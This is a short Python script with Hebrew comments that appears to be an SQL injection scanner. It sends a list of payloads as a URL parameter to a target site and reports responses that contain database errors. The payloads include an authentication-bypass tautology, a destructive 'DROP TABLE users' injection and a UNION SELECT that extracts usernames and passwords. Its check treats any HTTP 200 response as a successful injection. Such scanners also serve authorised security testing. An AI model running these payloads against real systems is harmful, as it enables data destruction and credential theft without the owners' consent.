import requests

# במקום להגדיר רשימה, ניתן לקרוא קבצי הזרקה
sql_injections = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "'; DROP TABLE users --",
    "' UNION SELECT NULL, username, password FROM users --",
]

# פונקציה לשלוח בקשות ולבדוק את התגובה
def test_sql_injection(Url, injection):
    # נבנה את ה-URL עם פרמטר שיכול להיות רגיש להזרקה
    vulnerable_url = f"{Url}?id={injection}"

    try:
        # שליחת הבקשה
        response = requests.get(vulnerable_url)

        # נבחן את התגובה
        if response.status_code == 200:
            print(f"SQL Injection test successful for injection: {injection}")
            return response.text  # מחזיר את התוכן של התגובה
        else:
            print(f"Failed request for injection: {injection}")
    except Exception as e:
        print(f"Error testing injection {injection}: {e}")
    return None


# בדיקת הזרקות SQL לאתר
def check_website_for_sql_injection(Url):
    for injection in sql_injections:
        print(f"Testing URL: {Url} with injection: {injection}")
        response = test_sql_injection(Url, injection)

        if response:
            if "error" in response or "mysql" in response.lower():
                print(f"Possible SQL Injection vulnerability detected at: {Url}")
                print("Response contains error message: ", response)
                break


# דוגמת URL לבדיקת SQL Injection (ניתן להחלפה בכתובת אמיתית)
url = "http://example.com/product"
check_website_for_sql_injection(url)
